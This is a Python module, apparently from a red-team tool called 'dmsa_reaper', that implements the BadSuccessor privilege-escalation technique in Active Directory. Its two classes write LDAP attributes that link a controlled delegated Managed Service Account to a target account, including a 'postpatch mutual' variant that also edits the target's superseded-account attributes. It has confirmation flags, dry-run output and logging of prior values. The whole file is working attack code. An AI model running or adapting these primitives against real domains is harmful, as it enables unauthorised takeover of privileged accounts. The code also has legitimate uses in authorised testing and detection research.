from __future__ import annotations

from typing import TYPE_CHECKING, Any

from dmsa_reaper.ldap.modify import modify_attribute
from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.ops.verify import verify_operation_ldap
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_STATE_COMPLETED,
    read_attribute,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError

if TYPE_CHECKING:
    from ldap3 import Connection

_STATE_ACTIVE = 2
_TARGET_ATTRS = frozenset({
    "msDS-SupersededManagedAccountLink",
    "msDS-SupersededServiceAccountState",
})


def _values(values: list[Any] | None) -> list[AttributeValue] | None:
    return [AttributeValue.from_python(v) for v in values] if values else None


def _recorded_replace(
    operation: Operation,
    conn: "Connection",
    *,
    dn: str,
    attribute: str,
    values: list[Any],
    step_name: str,
) -> None:
    before = read_attribute(conn, dn, attribute)
    change = AttributeChange(
        dn=dn,
        attribute=attribute,
        before=_values(before),
        after=[AttributeValue.from_python(v) for v in values],
        mode="replace",
        step_name=step_name,
        step_status="planned",
    )
    operation.changed_attrs.append(change)
    save_operation(operation)
    modify_attribute(conn, dn, attribute, values, mode="replace")
    change.step_status = "written"
    save_operation(operation)


class ExistingDmsaLegacyLinkPrimitive(Primitive):
    """Legacy/lab existing-dMSA link primitive.

    This only writes dMSA-side attributes. It is not sufficient for patched
    post-BadSuccessor KDC behavior unless the reciprocal target-side state is
    already present, so execution requires an explicit legacy flag.
    """

    name = "existing-dmsa-legacy-link"

    def check(self, path: PathCandidate) -> bool:
        return path.primitive == self.name and path.requires_modify_dmsa

    def plan(self, path: PathCandidate) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
        )

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")
        if not operation.metadata.get("allow_existing_dmsa_legacy_link"):
            raise PrimitiveError(
                "existing-dmsa-legacy-link requires --allow-existing-dmsa-legacy-link"
            )

        meta = operation.metadata
        dmsa_dn = resolve_meta(meta, "dmsa_dn")
        target_dn = resolve_meta(meta, "target_dn")
        if not dmsa_dn:
            raise PrimitiveError("dmsa_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError("target_dn is required in operation metadata (pass --target-dn)")

        operation.status = "running"
        try:
            _recorded_replace(
                operation,
                conn,
                dn=dmsa_dn,
                attribute="msDS-ManagedAccountPrecededByLink",
                values=[target_dn],
                step_name="dmsa-preceded-by",
            )
            _recorded_replace(
                operation,
                conn,
                dn=dmsa_dn,
                attribute="msDS-DelegatedMSAState",
                values=[DMSA_STATE_COMPLETED],
                step_name="dmsa-state",
            )
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"existing dmsa legacy write {dmsa_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(f"Execute failed; partial state is recorded: {exc}") from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
        return verify_operation_ldap(operation, conn=conn)

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        dmsa_dn = resolve_meta(meta, "dmsa_dn") or "<dmsa_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        return [
            "WARNING: legacy existing-dMSA mode writes only dMSA-side attributes.",
            "Patched KDCs require the reciprocal target-side relationship unless it already exists.",
            "",
            f"STEP 1  MODIFY  {dmsa_dn}",
            f"  msDS-ManagedAccountPrecededByLink       -> {target_dn}",
            "  (current value will be recorded before the write)",
            "",
            f"STEP 2  MODIFY  {dmsa_dn}",
            f"  msDS-DelegatedMSAState                  -> {DMSA_STATE_COMPLETED}  (migration-completed)",
            "  (current value will be recorded before the write)",
        ]


class ExistingDmsaPostPatchMutualPrimitive(Primitive):
    """Use an existing controlled dMSA and establish the full postpatch mutual relationship."""

    name = "existing-dmsa-postpatch-mutual"

    def check(self, path: PathCandidate) -> bool:
        return (
            path.primitive == self.name
            and path.requires_modify_dmsa
            and path.requires_modify_target
        )

    def plan(self, path: PathCandidate) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
        )

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        dmsa_dn = resolve_meta(meta, "dmsa_dn")
        target_dn = resolve_meta(meta, "target_dn")
        if not dmsa_dn:
            raise PrimitiveError("dmsa_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError("target_dn is required in operation metadata (pass --target-dn)")

        writable = set(meta.get("target_writable_attrs") or [])
        if not _TARGET_ATTRS.issubset(writable) and not meta.get("allow_unmapped_target"):
            raise PrimitiveError(
                "existing-dmsa-postpatch-mutual requires target-side WriteProperty on "
                "msDS-SupersededManagedAccountLink and msDS-SupersededServiceAccountState"
            )

        operation.status = "running"
        try:
            _recorded_replace(
                operation,
                conn,
                dn=dmsa_dn,
                attribute="msDS-ManagedAccountPrecededByLink",
                values=[target_dn],
                step_name="dmsa-preceded-by",
            )
            _recorded_replace(
                operation,
                conn,
                dn=dmsa_dn,
                attribute="msDS-DelegatedMSAState",
                values=[DMSA_STATE_COMPLETED],
                step_name="dmsa-state",
            )
            _recorded_replace(
                operation,
                conn,
                dn=target_dn,
                attribute="msDS-SupersededManagedAccountLink",
                values=[dmsa_dn],
                step_name="target-superseded-link",
            )
            _recorded_replace(
                operation,
                conn,
                dn=target_dn,
                attribute="msDS-SupersededServiceAccountState",
                values=[_STATE_ACTIVE],
                step_name="target-superseded-state",
            )
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"existing dmsa postpatch write {dmsa_dn} -> {target_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(f"Execute failed; partial state is recorded: {exc}") from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
        return verify_operation_ldap(operation, conn=conn)

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        dmsa_dn = resolve_meta(meta, "dmsa_dn") or "<dmsa_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        return [
            f"STEP 1  MODIFY  {dmsa_dn}",
            f"  msDS-ManagedAccountPrecededByLink       -> {target_dn}",
            "  (current value will be recorded before the write)",
            "",
            f"STEP 2  MODIFY  {dmsa_dn}",
            f"  msDS-DelegatedMSAState                  -> {DMSA_STATE_COMPLETED}  (migration-completed)",
            "  (current value will be recorded before the write)",
            "",
            f"STEP 3  MODIFY  {target_dn}",
            f"  msDS-SupersededManagedAccountLink       -> {dmsa_dn}",
            "  (current value will be recorded before the write)",
            "",
            f"STEP 4  MODIFY  {target_dn}",
            f"  msDS-SupersededServiceAccountState      -> {_STATE_ACTIVE}",
            "  (current value will be recorded before the write)",
        ]


# Backward-compatible class alias for imports; the registry and classifier use
# explicit postpatch/legacy primitive names.
ExistingDmsaControlPrimitive = ExistingDmsaPostPatchMutualPrimitive
